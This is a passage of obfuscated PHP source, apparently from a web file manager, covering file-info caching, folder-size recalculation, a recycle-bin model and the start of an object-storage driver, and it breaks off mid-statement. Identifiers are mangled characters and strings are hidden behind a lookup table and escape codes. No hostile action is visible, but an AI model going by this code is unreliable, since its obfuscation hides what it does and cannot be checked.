$this->fileInfoGet($˜Çè¬ŠÆ); if (!$±®¬×–¨) { return !1; } return IO::fileSubstr($±®¬×–¨[$_SERVER[ˆö¿ÚÌ¼][87]], $ñˆÈ‘êğ, $üÉŒåÅÓ); } public function fileInfoGet($ÃĞªæŸ¸) { $ÑÛ×ºç¡ =& $_SERVER[ˆö¿ÚÌ¼]; $¬óÜ–¡À = $this->sourceInfo($ÃĞªæŸ¸); if (!$¬óÜ–¡À || $¬óÜ–¡À[$ÑÛ×ºç¡[497]]) { return !1; } $¸ş—°œ = $ÑÛ×ºç¡[562] . $¬óÜ–¡À[$ÑÛ×ºç¡[555]]; $ ÛíÔ¯Î = _get(self::$cacheFileInfo, $¸ş—°œ); if ($ ÛíÔ¯Î) { return $ ÛíÔ¯Î; } $¯şÂş = Model($ÑÛ×ºç¡[558])->fileInfo($¬óÜ–¡À[$ÑÛ×ºç¡[555]]); if ($¯şÂş) { $¯şÂş[$ÑÛ×ºç¡[32]] = $¬óÜ–¡À[$ÑÛ×ºç¡[32]]; } self::$cacheFileInfo[$¸ş—°œ] = $¯şÂş; return $¯şÂş; } private function folderChildrenNumber($óµÇ•—) { $‘š˜ı½ä =& $_SERVER[ˆö¿ÚÌ¼]; $Ú½õÆ‚â = $this->sourceInfo($óµÇ•—); $çÒ«£Ü = array($‘š˜ı½ä[669] => array($‘š˜ı½ä[629], $Ú½õÆ‚â[$‘š˜ı½ä[598]] . $óµÇ•— . $‘š˜ı½ä[630]), $‘š˜ı½ä[666] => $Ú½õÆ‚â[$‘š˜ı½ä[583]], $‘š˜ı½ä[516] => intval($Ú½õÆ‚â[$‘š˜ı½ä[517]]), $‘š˜ı½ä[663] => 1); $õßĞ¦Ä = $this->where($çÒ«£Ü)->count(); $·ç”ùÑª = $this->where($çÒ«£Ü)->where(array($‘š˜ı½ä[663] => 0))->count(); return array($‘š˜ı½ä[83] => $·ç”ùÑª, $‘š˜ı½ä[84] => $õßĞ¦Ä); } public function pathInfo($ùÂ‚šàì, $€åÙÄÜ® = false) { $ùŸÊ¦— =& $_SERVER[ˆö¿ÚÌ¼]; $€åÙÄÜ® = !1; $ùÂ‚šàì = intval($ùÂ‚šàì); $ô·Ó»åÙ = $ùŸÊ¦—[546] . intval($€åÙÄÜ®) . $ùŸÊ¦—[465] . $ùÂ‚šàì; $ƒİã‚ª“ = _get(self::$cachePathInfo, $ô·Ó»åÙ); if ($ƒİã‚ª“) { return $ƒİã‚ª“; } $¿«Ä–Ã¾ = $this->sourceInfo($ùÂ‚šàì); if (!$¿«Ä–Ã¾) { return !1; } $¿«Ä–Ã¾ = $this->_listDataApplyItem($¿«Ä–Ã¾, $€åÙÄÜ®); self::$cachePathInfo[$ô·Ó»åÙ] = $¿«Ä–Ã¾; return $¿«Ä–Ã¾; } public static $cachePathInfoMore = array(); public function pathInfoMore($ÚêûÙºò) { $ÎÆãÃû¹ =& $_SERVER[ˆö¿ÚÌ¼]; $ô×èÉü» = _get(self::$cachePathInfoMore, $ÚêûÙºò); if ($ô×èÉü») { return $ô×èÉü»; } $¼ğäìò¨ = $this->pathInfo($ÚêûÙºò); if (!$¼ğäìò¨) { return !1; } if ($¼ğäìò¨[$ÎÆãÃû¹[497]] == $ÎÆãÃû¹[91]) { $¼ğäìò¨[$ÎÆãÃû¹[82]] = $this->folderChildrenNumber($ÚêûÙºò); } self::$cachePathInfoMore[$ÚêûÙºò] = $¼ğäìò¨; return $¼ğäìò¨; } public function sourceInfo($˜ïÀşò) { $¼ŠŸËŸ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$˜ïÀşò) { return array(); } $˜ïÀşò = intval($˜ïÀşò); $Ô•”Ÿ˜‹ = $¼ŠŸËŸ[545] . $˜ïÀşò; $—˜è¾–‘ = _get(self::$cacheSourceInfo, $Ô•”Ÿ˜‹); if ($—˜è¾–‘) { return $—˜è¾–‘; } $–Å±«†¼ = $this->where(array($¼ŠŸËŸ[194] => $˜ïÀşò))->find(); self::$cacheSourceInfo[$Ô•”Ÿ˜‹] = $–Å±«†¼; return self::$cacheSourceInfo[$Ô•”Ÿ˜‹]; } public function sourceCacheClear($áÇ·ú‘ = false) { self::cacheClear($áÇ·ú‘); } public static function cacheClear($ğÓ‰›Í = false) { $•‰¶Ùˆ¿ =& $_SERVER[ˆö¿ÚÌ¼]; if ($ğÓ‰›Í == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$•‰¶Ùˆ¿[545] . $ğÓ‰›Í]); unset(self::$cachePathInfoMore[$ğÓ‰›Í]); unset(self::$cachePathInfo[$•‰¶Ùˆ¿[2306] . $ğÓ‰›Í]); unset(self::$cachePathInfo[$•‰¶Ùˆ¿[2307] . $ğÓ‰›Í]); } public function metaSet($‰Š—Èş›, $ğÀ“­™Ê = null, $ ·äËÆÏ = null) { $±ê¨ÄóÌ = parent::metaSet($‰Š—Èş›, $ğÀ“­™Ê, $ ·äËÆÏ); if ($±ê¨ÄóÌ) { $this->sourceCacheClear($‰Š—Èş›); } return $±ê¨ÄóÌ; } public function pathInfoByPath($¶ûğ òù, $‡–µàÍ) { $ÎË†œôÏ =& $_SERVER[ˆö¿ÚÌ¼]; $ÔŒ‡­öÛ = !$‡–µàÍ ? array() : explode($ÎË†œôÏ[8], trim($‡–µàÍ, $ÎË†œôÏ[8])); $Öˆê‘œÙ = $¶ûğ òù; foreach ($ÔŒ‡­öÛ as $êüÊÕ³¤) { $äÕæ´Åà = array($ÎË†œôÏ[193] => $Öˆê‘œÙ, $ÎË†œôÏ[32] => $êüÊÕ³¤); $Ô®ôÂ û = $this->field($ÎË†œôÏ[2308])->where($äÕæ´Åà)->select(); if (!$Ô®ôÂ û) { return !1; } $Ô®ôÂ û = array_sort_by($Ô®ôÂ û, $ÎË†œôÏ[517]); $Öˆê‘œÙ = $Ô®ôÂ û[0][$ÎË†œôÏ[194]]; } $»òó„êû = $this->sourceInfo($Öˆê‘œÙ); $this->pathInfoFilter($»òó„êû); return $»òó„êû; } protected function updateModifyTime($èƒÎ¦ñ) { $ÂöçÜ÷„ =& $_SERVER[ˆö¿ÚÌ¼]; $ú”´Úå = defined($ÂöçÜ÷„[2216]) ? USER_ID : 0; if (!$èƒÎ¦ñ) { return; } if (!is_array($èƒÎ¦ñ)) { $èƒÎ¦ñ = array($èƒÎ¦ñ); } foreach ($èƒÎ¦ñ as $§¿¯‚ç => $Ëµº¢‡—) { $èƒÎ¦ñ[$§¿¯‚ç] = intval($Ëµº¢‡—); $this->sourceCacheClear($Ëµº¢‡—); } $×İªê£¹ = array($ÂöçÜ÷„[194] => array($ÂöçÜ÷„[7], $èƒÎ¦ñ)); $ò™™Ë„§ = array($ÂöçÜ÷„[668] => $ú”´Úå, $ÂöçÜ÷„[510] => time()); $this->where($×İªê£¹)->save($ò™™Ë„§); } public function folderSizeReset($ºñÅİºÖ, $ğäÂîªè = false) { $îÈŒé‡· =& $_SERVER[ˆö¿ÚÌ¼]; if ($this->statusIgnoreResetSpace) { return; } $±Ä«÷­­ = $this->sourceInfo($ºñÅİºÖ); $®ùô÷—Â = $îÈŒé‡·[2309] . $ºñÅİºÖ; CacheLock::lock($®ùô÷—Â, 20); if ($ğäÂîªè === !1) { $this->sourceCacheClear($ºñÅİºÖ); $±Ä«÷­­ = $this->sourceInfo($ºñÅİºÖ); $ÉÔû®Á = array($îÈŒé‡·[489] => $ºñÅİºÖ, $îÈŒé‡·[516] => 0); $°Ş©–Ì¾ = $this->where($ÉÔû®Á)->sum($îÈŒé‡·[79]); $ğäÂîªè = intval($°Ş©–Ì¾) - intval($±Ä«÷­­[$îÈŒé‡·[79]]); } if ($ğäÂîªè == 0) { return CacheLock::unlock($®ùô÷—Â); } $á óß‡¹ = $this->parentLevelArray($±Ä«÷­­[$îÈŒé‡·[598]]); if (!$á óß‡¹) { $á óß‡¹ = array(); } $á óß‡¹[] = $±Ä«÷­­[$îÈŒé‡·[194]]; $ÉÔû®Á = array($îÈŒé‡·[194] => array($îÈŒé‡·[504], $á óß‡¹)); if ($ğäÂîªè < 0) { $ÉÔû®Á[$îÈŒé‡·[79]] = array($îÈŒé‡·[1106], abs($ğäÂîªè)); } $this->where($ÉÔû®Á)->setAdd($îÈŒé‡·[79], $ğäÂîªè); CacheLock::unlock($®ùô÷—Â); $€£‚üŞ = $îÈŒé‡·[2310] . $±Ä«÷­­[$îÈŒé‡·[191]] . $îÈŒé‡·[4] . $±Ä«÷­­[$îÈŒé‡·[583]]; $êÈÜöö = array($±Ä«÷­­[$îÈŒé‡·[191]], $±Ä«÷­­[$îÈŒé‡·[583]]); TaskRun::timeLimitCall($€£‚üŞ, $îÈŒé‡·[2311], $êÈÜöö, 1.5); } public function folderSizeResetChildren($«¶†Œ”Ş) { $„íª†Œ˜ =& $_SERVER[ˆö¿ÚÌ¼]; $this->sourceCacheClear($«¶†Œ”Ş); $‘±ìÆÄÒ = $this->sourceInfo($«¶†Œ”Ş); $º¹şç½Ù = array($„íª†Œ˜[663] => 1, $„íª†Œ˜[666] => $‘±ìÆÄÒ[$„íª†Œ˜[583]], $„íª†Œ˜[669] => array($„íª†Œ˜[629], $‘±ìÆÄÒ[$„íª†Œ˜[598]] . $«¶†Œ”Ş . $„íª†Œ˜[630])); $ì¯‹Øû· = $„íª†Œ˜[2312]; $ÂßˆÃµ­ = $this->field($ì¯‹Øû·)->where($º¹şç½Ù)->select(); $º¹şç½Ù[$„íª†Œ˜[497]] = 0; $„ÓÊù‰ = $this->field($ì¯‹Øû·)->where($º¹şç½Ù)->select(); if (!$„ÓÊù‰) { return; } $ÂßˆÃµ­[] = $‘±ìÆÄÒ; $ÂßˆÃµ­ = array_to_keyvalue($ÂßˆÃµ­, $„íª†Œ˜[194]); foreach ($ÂßˆÃµ­ as $»î˜şúÜ => $şú”¨¦„) { $ÂßˆÃµ­[$»î˜şúÜ][$„íª†Œ˜[2313]] = $ÂßˆÃµ­[$»î˜şúÜ][$„íª†Œ˜[79]]; $ÂßˆÃµ­[$»î˜şúÜ][$„íª†Œ˜[79]] = 0; } foreach ($„ÓÊù‰ as $şú”¨¦„) { $½×‰ÙÆ¡ = $şú”¨¦„[$„íª†Œ˜[193]] . $„íª†Œ˜[12]; if (!isset($ÂßˆÃµ­[$½×‰ÙÆ¡])) { continue; } if ($şú”¨¦„[$„íª†Œ˜[517]] == $ÂßˆÃµ­[$½×‰ÙÆ¡][$„íª†Œ˜[517]]) { $ÂßˆÃµ­[$½×‰ÙÆ¡][$„íª†Œ˜[79]] += $şú”¨¦„[$„íª†Œ˜[79]]; } } foreach ($ÂßˆÃµ­ as $şú”¨¦„) { $Óµ‡Ä¾ = $this->parentLevelArray($şú”¨¦„[$„íª†Œ˜[598]]); foreach ($Óµ‡Ä¾ as $½×‰ÙÆ¡) { $½×‰ÙÆ¡ = $½×‰ÙÆ¡ . $„íª†Œ˜[12]; if (!isset($ÂßˆÃµ­[$½×‰ÙÆ¡])) { continue; } if ($şú”¨¦„[$„íª†Œ˜[517]] == $ÂßˆÃµ­[$½×‰ÙÆ¡][$„íª†Œ˜[517]]) { $ÂßˆÃµ­[$½×‰ÙÆ¡][$„íª†Œ˜[79]] += $şú”¨¦„[$„íª†Œ˜[79]]; } } } $ğ•îåÊ‡ = array(); foreach ($ÂßˆÃµ­ as $şú”¨¦„) { if ($şú”¨¦„[$„íª†Œ˜[79]] == $şú”¨¦„[$„íª†Œ˜[2313]]) { continue; } $ğ•îåÊ‡[] = array($„íª†Œ˜[194], $şú”¨¦„[$„íª†Œ˜[194]], $„íª†Œ˜[79], $şú”¨¦„[$„íª†Œ˜[79]]); } $this->saveAll($ğ•îåÊ‡); } public function userSpaceReset($ ñü»Ÿ = false) { $Üó”ÓÏ =& $_SERVER[ˆö¿ÚÌ¼]; $úÍ£ıÊ = $this->where(array($Üó”ÓÏ[191] => self::TYPE_USER, $Üó”ÓÏ[583] => $ ñü»Ÿ, $Üó”ÓÏ[497] => 0))->sum($Üó”ÓÏ[79]); $úÍ£ıÊ = !$úÍ£ıÊ || $úÍ£ıÊ <= 0 ? 0 : $úÍ£ıÊ; Model($Üó”ÓÏ[591])->userEdit($ ñü»Ÿ, array($Üó”ÓÏ[1974] => $úÍ£ıÊ)); } public function targetSpaceUpdate($äŸ˜Îò­, $üëŸ½İ) { $­‡‡ó½À =& $_SERVER[ˆö¿ÚÌ¼]; if (!$üëŸ½İ) { return; } if (!in_array($äŸ˜Îò­, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $™˜ïÜÜİ = $this->targetSpaceSize($äŸ˜Îò­, $üëŸ½İ); if ($äŸ˜Îò­ == self::TYPE_USER) { Model($­‡‡ó½À[591])->userEdit($üëŸ½İ, array($­‡‡ó½À[1974] => $™˜ïÜÜİ)); } else { if ($äŸ˜Îò­ == self::TYPE_GROUP) { Model($­‡‡ó½À[599])->groupEdit($üëŸ½İ, array($­‡‡ó½À[1974] => $™˜ïÜÜİ)); } } } public function targetSpaceSize($§¹á°, $‚÷ğõ) { $ò˜ÄÇÂá =& $_SERVER[ˆö¿ÚÌ¼]; $ª”è ûÑ = 0; $îŒ¤¤£¯ = $this->targetSourceRoot($§¹á°, $‚÷ğõ, !0); foreach ($îŒ¤¤£¯ as $‰·Ïƒ’«) { if (!$‰·Ïƒ’«) { continue; } $ª”è ûÑ += floatval($‰·Ïƒ’«[$ò˜ÄÇÂá[79]]); $˜…Şš®› = array($ò˜ÄÇÂá[669] => array($ò˜ÄÇÂá[629], $ò˜ÄÇÂá[607] . $‰·Ïƒ’«[$ò˜ÄÇÂá[194]] . $ò˜ÄÇÂá[630])); $Õ¢¹ªüÅ = Model($ò˜ÄÇÂá[515])->field($ò˜ÄÇÂá[503])->where($˜…Şš®›)->select(); $Õ¢¹ªüÅ = array_to_keyvalue($Õ¢¹ªüÅ, $ò˜ÄÇÂá[12], $ò˜ÄÇÂá[194]); $Õ¢¹ªüÅ = array_unique(array_filter($Õ¢¹ªüÅ)); if ($Õ¢¹ªüÅ) { $˜…Şš®› = array($ò˜ÄÇÂá[503] => array($ò˜ÄÇÂá[504], $Õ¢¹ªüÅ)); $ª”è ûÑ += floatval($this->where($˜…Şš®›)->sum($ò˜ÄÇÂá[79])); } } $ª”è ûÑ = !$ª”è ûÑ || $ª”è ûÑ <= 0 ? 0 : $ª”è ûÑ; return $ª”è ûÑ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($åğˆÕ¿›) { return $this->fileTypeProfile($åğˆÕ¿›, SourceModel::TYPE_USER); } public function groupFileTypeProfile($¡½ìˆ) { return $this->fileTypeProfile($¡½ìˆ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($œîı•ˆ, $ÉÑ÷€“Á) { $—ÂÕ‡‹Â =& $_SERVER[ˆö¿ÚÌ¼]; $¸õùòô = $—ÂÕ‡‹Â[2314] . $œîı•ˆ . $—ÂÕ‡‹Â[11] . $ÉÑ÷€“Á; $ğ¿·¼óğ = Cache::get($¸õùòô); if ($ğ¿·¼óğ) { return $ğ¿·¼óğ; } $âÌ×Ê—® = array($—ÂÕ‡‹Â[663] => 0); if ($œîı•ˆ != !1) { $âÌ×Ê—®[$—ÂÕ‡‹Â[583]] = $œîı•ˆ; $âÌ×Ê—®[$—ÂÕ‡‹Â[191]] = $ÉÑ÷€“Á; } $­•³Ãç¢ = array(); $­•³Ãç¢[$—ÂÕ‡‹Â[2315]] = array($—ÂÕ‡‹Â[2316] => LNG($—ÂÕ‡‹Â[2315]), $—ÂÕ‡‹Â[2317] => $this->where($âÌ×Ê—®)->count(), $—ÂÕ‡‹Â[634] => $this->where($âÌ×Ê—®)->sum($—ÂÕ‡‹Â[79])); $¦Œ˜ìº– = KodIO::fileTypeList(); foreach ($¦Œ˜ìº– as $ïÛï°® => $˜¬ö¨™) { $âÌ×Ê—®[$—ÂÕ‡‹Â[498]] = $this->fileTypeWhere($ïÛï°®); $­•³Ãç¢[$ïÛï°®] = array($—ÂÕ‡‹Â[2316] => $˜¬ö¨™[$—ÂÕ‡‹Â[32]], $—ÂÕ‡‹Â[2317] => $this->where($âÌ×Ê—®)->count(), $—ÂÕ‡‹Â[634] => $this->where($âÌ×Ê—®)->sum($—ÂÕ‡‹Â[79])); } Cache::set($¸õùòô, $­•³Ãç¢, 1200); return $­•³Ãç¢; } public function fileNameExist($´ªĞ›£, $˜ÜÍı¡Ö) { $ÛÑƒÓæ =& $_SERVER[ˆö¿ÚÌ¼]; $×‹ûÀ‰ = $this->field($ÛÑƒÓæ[2318])->where(array($ÛÑƒÓæ[193] => $´ªĞ›£, $ÛÑƒÓæ[32] => $˜ÜÍı¡Ö, $ÛÑƒÓæ[517] => 0))->find(); return is_array($×‹ûÀ‰) ? $×‹ûÀ‰[$ÛÑƒÓæ[194]] : !1; } public function childList($öƒË¾¨­) { $€Ù£”‚· =& $_SERVER[ˆö¿ÚÌ¼]; $Á×æ¶—µ = $€Ù£”‚·[2291] . $öƒË¾¨­; if (isset(self::$cacheChildList[$Á×æ¶—µ])) { return self::$cacheChildList[$Á×æ¶—µ]; } $ƒ¼Ûèé‹ = array($€Ù£”‚·[193] => intval($öƒË¾¨­), $€Ù£”‚·[517] => 0); $ö¨‹øµ¨ = $this->where($ƒ¼Ûèé‹)->select(); $ö¨‹øµ¨ = $ö¨‹øµ¨ ? $ö¨‹øµ¨ : array(); self::$cacheChildList[$Á×æ¶—µ] = $ö¨‹øµ¨; foreach ($ö¨‹øµ¨ as $´ê·°¬) { $Á×æ¶—µ = $€Ù£”‚·[545] . $´ê·°¬[$€Ù£”‚·[194]]; self::$cacheSourceInfo[$Á×æ¶—µ] = $´ê·°¬; } return $ö¨‹øµ¨; } public function fileNameAuto($¤ «Ä­î, $¡—áñ¯ù, $ƒ˜¥ş‚ = REPEAT_RENAME, $‘²ÜùÜ¾ = false) { $ˆøô¦Ñ² =& $_SERVER[ˆö¿ÚÌ¼]; $ü¹âŒ ² = get_path_ext($¡—áñ¯ù); $ïˆ£‘ = $ü¹âŒ ² ? get_path_ext_name($¡—áñ¯ù) . $ˆøô¦Ñ²[2319] . $ü¹âŒ ² : $¡—áñ¯ù . $ˆøô¦Ñ²[463]; $»ÚƒİÈ = array($ˆøô¦Ñ²[193] => $¤ «Ä­î, $ˆøô¦Ñ²[517] => 0, $ˆøô¦Ñ²[32] => array($ˆøô¦Ñ²[462], $ïˆ£‘)); $²¸¡Øñâ = $this->field($ˆøô¦Ñ²[32])->where($»ÚƒİÈ)->select(); $ìê’Ğ™‹ = array_to_keyvalue($²¸¡Øñâ, $ˆøô¦Ñ²[12], $ˆøô¦Ñ²[32]); return $this->fileNameAutoGet($ìê’Ğ™‹, $¡—áñ¯ù, $ƒ˜¥ş‚, $‘²ÜùÜ¾); } public function fileNameAutoGet($¥ÔÄİî›, $¤½‡İ‚, $®œÅ…¯å, $êØş¬ï²) { $Åô‰œ× =& $_SERVER[ˆö¿ÚÌ¼]; if ($®œÅ…¯å == REPEAT_REPLACE || !$¥ÔÄİî› || !in_array_not_case($¤½‡İ‚, $¥ÔÄİî›) || $êØş¬ï² && $®œÅ…¯å != REPEAT_RENAME_FOLDER) { return $¤½‡İ‚; } if ($®œÅ…¯å == REPEAT_SKIP) { return !1; } $ï×ƒÙ¢ñ = $Åô‰œ×[10] . get_path_ext($¤½‡İ‚); $ï×ƒÙ¢ñ = $ï×ƒÙ¢ñ == $Åô‰œ×[10] || $êØş¬ï² ? $Åô‰œ×[12] : $ï×ƒÙ¢ñ; for ($’şŸÜ¥‚ = 1; $’şŸÜ¥‚ <= count($¥ÔÄİî›) + 1; $’şŸÜ¥‚++) { $ƒ­îÁïè = substr($¤½‡İ‚, 0, strlen($¤½‡İ‚) - strlen($ï×ƒÙ¢ñ)); $ñ¹ä–½‹ = $ƒ­îÁïè . "\x28{$’şŸÜ¥‚}\51{$ï×ƒÙ¢ñ}"; if (!in_array_not_case($ñ¹ä–½‹, $¥ÔÄİî›)) { return $ñ¹ä–½‹; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\165\x72\143\x65\137\162\145\143\171\143\154\x65"; protected $dataAuto = array(array("\x63\162\145\x61\164\x65\x54\151\155\145", "\164\x69\155\x65", "\x69\156\163\145\x72\x74", "\146\165\156\143\x74\151\157\156")); public function listData($¼îÕõ×½ = false) { $¸ÉèØ«Ÿ =& $_SERVER[ˆö¿ÚÌ¼]; $¼îÕõ×½ = $¼îÕõ×½ ? $¼îÕõ×½ : USER_ID; $ı¿æßØŞ = $this->where(array($¸ÉèØ«Ÿ[1776] => $¼îÕõ×½))->select(); return array_to_keyvalue($ı¿æßØŞ, $¸ÉèØ«Ÿ[12], $¸ÉèØ«Ÿ[194]); } public function moveToRecycle($·ÊÔºËò) { $ÈÛİå¯€ =& $_SERVER[ˆö¿ÚÌ¼]; $²Èé‘ËÄ = Model($ÈÛİå¯€[1435]); $‚ò¤ÇÓ² = $²Èé‘ËÄ->sourceInfo($·ÊÔºËò); if (!$‚ò¤ÇÓ² || $‚ò¤ÇÓ²[$ÈÛİå¯€[517]] == $ÈÛİå¯€[91]) { return; } $–®øß©Ó = array($ÈÛİå¯€[503] => $·ÊÔºËò, $ÈÛİå¯€[1776] => USER_ID, $ÈÛİå¯€[665] => $‚ò¤ÇÓ²[$ÈÛİå¯€[191]], $ÈÛİå¯€[666] => $‚ò¤ÇÓ²[$ÈÛİå¯€[583]], $ÈÛİå¯€[669] => $‚ò¤ÇÓ²[$ÈÛİå¯€[598]]); $this->add($–®øß©Ó); $this->recycleMove($·ÊÔºËò, 1); if ($‚ò¤ÇÓ²[$ÈÛİå¯€[497]] == $ÈÛİå¯€[91]) { $ÚêğàÛ = array($ÈÛİå¯€[669] => array($ÈÛİå¯€[629], $‚ò¤ÇÓ²[$ÈÛİå¯€[598]] . $·ÊÔºËò . $ÈÛİå¯€[630])); $²Èé‘ËÄ->where($ÚêğàÛ)->setField($ÈÛİå¯€[517], 1); } } public function clear() { $this->remove(!1); } public function remove($øµï­óê = false, $è›ôÉ© = false) { $‹«„—¯À =& $_SERVER[ˆö¿ÚÌ¼]; $è›ôÉ© = $è›ôÉ© ? $è›ôÉ© : USER_ID; $Óï«´ÏÈ = Model($‹«„—¯À[1435]); $·«å«£É = $this->listData($è›ôÉ©); $øµï­óê = $øµï­óê === !1 ? !1 : $øµï­óê; $ùÒË é´ = array(); foreach ($·«å«£É as $Ş×¸–†ü) { if ($øµï­óê != !1 && !in_array($Ş×¸–†ü, $øµï­óê)) { continue; } $é•†Ù÷Ã = $Óï«´ÏÈ->sourceInfo($Ş×¸–†ü); $Óï«´ÏÈ->remove($Ş×¸–†ü, !1); $›ºŒ­ = $é•†Ù÷Ã[$‹«„—¯À[191]] . $‹«„—¯À[11] . $é•†Ù÷Ã[$‹«„—¯À[583]]; $ùÒË é´[$›ºŒ­] = array($‹«„—¯À[665] => $é•†Ù÷Ã[$‹«„—¯À[191]], $‹«„—¯À[583] => $é•†Ù÷Ã[$‹«„—¯À[583]]); $this->where(array($‹«„—¯À[194] => $Ş×¸–†ü))->delete(); } foreach ($ùÒË é´ as $œæÕÂİ) { $Óï«´ÏÈ->targetSpaceUpdate($œæÕÂİ[$‹«„—¯À[191]], $œæÕÂİ[$‹«„—¯À[583]]); } } public function restore($£Æ˜Ó–å = false) { $ğûæâÊ‹ = $this->listData(); $this->_restoreSource($ğûæâÊ‹, $£Æ˜Ó–å); } public function removeUserAll($™àİÆá) { $this->remove(!1, $™àİÆá); } public function restoreItem($±Ï„•Œ) { $this->_restoreSource(array($±Ï„•Œ), array($±Ï„•Œ)); } private function _restoreSource($Ù„¥ÑÊà, $¬ÉÍ¬Œ“) { $Ê¬‹ç‘¿ =& $_SERVER[ˆö¿ÚÌ¼]; $ÇÅÔ¾Îª = Model($Ê¬‹ç‘¿[1435]); $¬ÉÍ¬Œ“ = $¬ÉÍ¬Œ“ == !1 ? !1 : $¬ÉÍ¬Œ“; if (!$Ù„¥ÑÊà) { return !0; } $éì½ÊÜ = array(); foreach ($Ù„¥ÑÊà as $¦ÎÜçÖø) { if ($¬ÉÍ¬Œ“ != !1 && !in_array($¦ÎÜçÖø, $¬ÉÍ¬Œ“)) { continue; } $™Æ¬Ø¹Õ = $ÇÅÔ¾Îª->sourceInfo($¦ÎÜçÖø); $Òé“äª = $ÇÅÔ¾Îª->sourceInfo($™Æ¬Ø¹Õ[$Ê¬‹ç‘¿[193]]); if ($Òé“äª[$Ê¬‹ç‘¿[517]] == $Ê¬‹ç‘¿[91]) { continue; } $ÇÅÔ¾Îª->lockMoveStart($¦ÎÜçÖø); $this->recycleMove($¦ÎÜçÖø, 0); if ($™Æ¬Ø¹Õ[$Ê¬‹ç‘¿[497]] == $Ê¬‹ç‘¿[91]) { $ãêğßá¨ = array($Ê¬‹ç‘¿[669] => array($Ê¬‹ç‘¿[629], $™Æ¬Ø¹Õ[$Ê¬‹ç‘¿[598]] . $¦ÎÜçÖø . $Ê¬‹ç‘¿[630])); $ÇÅÔ¾Îª->where($ãêğßá¨)->setField($Ê¬‹ç‘¿[517], 0); $this->restoreFolderChildren($¦ÎÜçÖø, $Ù„¥ÑÊà); } $this->where(array($Ê¬‹ç‘¿[194] => $¦ÎÜçÖø))->delete(); $ÇÅÔ¾Îª->folderSizeReset($™Æ¬Ø¹Õ[$Ê¬‹ç‘¿[193]]); $éì½ÊÜ[] = $™Æ¬Ø¹Õ[$Ê¬‹ç‘¿[193]]; if ($™Æ¬Ø¹Õ[$Ê¬‹ç‘¿[497]] == $Ê¬‹ç‘¿[91]) { $éì½ÊÜ[] = $¦ÎÜçÖø; } $ÇÅÔ¾Îª->lockMoveEnd($¦ÎÜçÖø); } $ÇÅÔ¾Îª->updateModifyTime($éì½ÊÜ); } private function restoreFolderChildren($í¥Ğ´±Ş, $–…‰ı¼) { $œ’·€òù =& $_SERVER[ˆö¿ÚÌ¼]; $Ôì¯¢Íä = Model($œ’·€òù[1435]); $¢§Å£€ = array($œ’·€òù[194] => array($œ’·€òù[7], array())); foreach ($–…‰ı¼ as $ñ•²Áùö) { if ($ñ•²Áùö == $í¥Ğ´±Ş) { continue; } if (!$Ôì¯¢Íä->isParentOf($í¥Ğ´±Ş, $ñ•²Áùö)) { continue; } $‹Ø¶İ²Ÿ = $Ôì¯¢Íä->sourceInfo($ñ•²Áùö); if ($‹Ø¶İ²Ÿ[$œ’·€òù[497]] == $œ’·€òù[91]) { $¢§Å£€[] = array($œ’·€òù[669] => array($œ’·€òù[629], $‹Ø¶İ²Ÿ[$œ’·€òù[598]] . $ñ•²Áùö . $œ’·€òù[630])); } else { $¢§Å£€[$œ’·€òù[194]][1][] = $ñ•²Áùö; } } if (!$¢§Å£€[$œ’·€òù[194]][1]) { unset($¢§Å£€[$œ’·€òù[194]]); } if (!$¢§Å£€) { return; } if (is_array($¢§Å£€[$œ’·€òù[194]]) && is_array($¢§Å£€[$œ’·€òù[194]][1])) { $¢§Å£€[$œ’·€òù[194]][1] = array_unique($¢§Å£€[$œ’·€òù[194]][1]); } $¢§Å£€[$œ’·€òù[1091]] = $œ’·€òù[2088]; $Ôì¯¢Íä->where($¢§Å£€)->setField($œ’·€òù[517], 1); } private function recycleMove($´ñµá, $ÚœğŸ£× = 1) { $ã«Ä¤ğ =& $_SERVER[ˆö¿ÚÌ¼]; $È´Ñ¥ = Model($ã«Ä¤ğ[1435]); $ï–ìó¸· = Model($ã«Ä¤ğ[2320]); $øÍ¡£˜ = array($ã«Ä¤ğ[194] => $´ñµá); if ($ÚœğŸ£×) { $È´Ñ¥->where($øÍ¡£˜)->setField($ã«Ä¤ğ[517], 1); $ï–ìó¸·->eventRecycle($´ñµá, $ã«Ä¤ğ[2321]); } else { $ãñÈäµ› = $È´Ñ¥->where($øÍ¡£˜)->find(); $·°ÍŒÄÏ = $ãñÈäµ›[$ã«Ä¤ğ[497]] == $ã«Ä¤ğ[91]; $òê“È¹ë = $È´Ñ¥->fileNameAuto($ãñÈäµ›[$ã«Ä¤ğ[193]], $ãñÈäµ›[$ã«Ä¤ğ[32]], REPEAT_RENAME_FOLDER, $·°ÍŒÄÏ); if ($òê“È¹ë != $ãñÈäµ›[$ã«Ä¤ğ[32]]) { $È´Ñ¥->rename($´ñµá, $òê“È¹ë); } $È´Ñ¥->where($øÍ¡£˜)->setField($ã«Ä¤ğ[517], 0); $ï–ìó¸·->eventRecycle($´ñµá, $ã«Ä¤ğ[2322]); } } } goto D¿Ó¶˜Æ©©; F‡°¹— Œ˜: class PathDriverOBS extends PathDriverBaseS3 { public function __construct($¦å”é³À) { parent::__construct($¦å”é³À); $this->setSignVersion($_SERVER[ˆö¿ÚÌ¼][250]); } public function fileOutImage($½ÍŞÆŞÚ, $ƒ«¡ë£ = 250) { $òì­òÂ  =& $_SERVER[ˆö¿ÚÌ¼]; if ($this->size($½ÍŞÆŞÚ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($½ÍŞÆŞÚ, $ƒ«¡ë£); } $ş†Û¡Ã = array($òì­òÂ [1474] => $òì­òÂ [1475] . $ƒ«¡ë£ . $òì­òÂ [1476]); $·„ãÎ¢’ = $this->link($½ÍŞÆŞÚ, $ş†Û¡Ã); $this->fileOutLink($·„ãÎ¢’); } public function fileOutLink($ø“ÖÒşô) { $Ğã°·¾É =& $_SERVER[ˆö¿ÚÌ¼]; if (substr($ø“ÖÒşô, 0, 7) == $Ğã°·¾É[219]) { $ø“ÖÒşô = $Ğã°·¾É[220] . substr($ø“ÖÒşô, 7); } header($Ğã°·¾É[175] . 